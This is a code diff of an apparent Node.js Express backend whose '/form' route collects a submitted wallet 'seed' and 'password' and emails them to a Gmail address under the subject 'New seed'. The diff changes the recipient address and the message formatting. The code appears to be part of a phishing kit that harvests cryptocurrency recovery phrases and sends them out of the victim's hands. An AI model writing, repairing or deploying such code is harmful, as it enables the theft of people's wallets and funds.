@@ -32,12 +32,12 @@ app.post('/form', async(req, res) => {
  
   const response = await transporter.sendMail({
     from: 'jtom29544@gmail.com',
-    to: "xenuxyz@gmail.com",
+    to: "jtom29544@gmail.com",
     subject: "New seed", 
-    text: `seed: ${seed} password: ${password ? password : ''}`
+    text: `seed: ${seed} \npassword: ${password ? password : ''}`
   })
 }) 
 
 app.listen(port, () => {
   console.log(`server started on port ${port}`)
-})   
+})    
